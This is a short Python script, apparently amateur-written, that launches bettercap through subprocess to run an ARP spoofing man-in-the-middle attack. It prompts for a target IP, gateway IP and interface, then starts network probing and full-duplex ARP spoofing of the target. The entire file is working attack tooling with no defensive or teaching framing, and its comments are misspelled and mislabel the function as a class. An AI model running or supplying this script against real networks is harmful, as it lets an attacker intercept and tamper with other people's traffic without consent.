
#allows for sending comands
import subprocess


#class for runing the comands
def arp_spoof(target_ip, gateway_ip, iface="eth0"):
    #library of comands in order, each command is seperated by ;
    command = [
        "sudo", "bettercap", "-iface", iface, 
        "--eval", f"net.probe on; set arp.spoof.targets {target_ip}; set arp.spoof.internal true; set arp.spoof.fullduplex true; arp.spoof on"
    ]
    
    #will try to do the comand 
    try:
        print(f"Starting ARP spoofing on target {target_ip} through gateway {gateway_ip}...")
        subprocess.run(command)
        print("ARP spoofing attack initiated.")
    #if it fails it will print the errro    
    except Exception as e:
        print(f"An error occurred: {e}")

#inputs needed to spoof the address
target_ip = input("Enter the target IP address: ")
gateway_ip = input("Enter the gateway IP address: ")
interface = input("Enter the network interface (e.g., eth0): ")
arp_spoof(target_ip, gateway_ip, interface)#end of class
